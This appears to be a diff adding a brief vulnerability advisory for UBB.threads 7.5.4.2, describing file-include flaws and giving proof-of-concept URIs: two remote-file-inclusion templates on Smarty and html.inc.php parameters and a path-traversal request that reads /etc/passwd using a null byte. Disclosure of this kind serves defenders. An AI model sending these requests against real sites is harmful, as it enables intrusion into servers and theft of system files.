@@ -1,0 +1,14 @@
+UBBCentral: http://www.ubbcentral.com/
+
+UBB.threads is prone to multiple file-include vulnerabilities because it fails to sufficiently sanitize user-supplied data. Exploiting these issues may allow an attacker to compromise the application and the computer; other attacks are also possible.
+
+UBB.threads 7.5.4.2 is vulnerable; other versions may also be affected. 
+
+POC:
+An attacker can exploit these issues via a browser.
+
+The following example URIs are available:
+
+http://server/path/ubb/libs/smarty/Smarty_Compiler.class.php?_plugins_params=[RFI]
+http://server/path/ubb/libs/html.inc.php?[USER_LANGUAGE]=[RFI]
+http://server/path/ubb/ubbthreads.php?file=../../../../../../../../etc/passwd%00 
